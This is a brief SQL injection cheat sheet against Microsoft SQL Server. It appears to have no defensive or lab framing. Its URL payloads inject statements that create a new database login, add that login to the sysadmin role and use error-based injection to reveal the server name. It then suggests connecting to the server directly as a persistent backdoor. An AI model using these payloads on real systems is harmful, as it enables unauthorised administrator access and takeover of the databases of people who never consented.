-- Create user login directly to the database
<URL>'; create login mylogin with password='password'--

-- Add the newly created login user to the admin role
<URL>'; alter server role sysadmin add member mylogin--

-- using error base injection to get the server name
<URL>' and 1=@@servername--

-- The try connecting to the server directly if the actions above were successful
-- It will depend on the server config for this to work
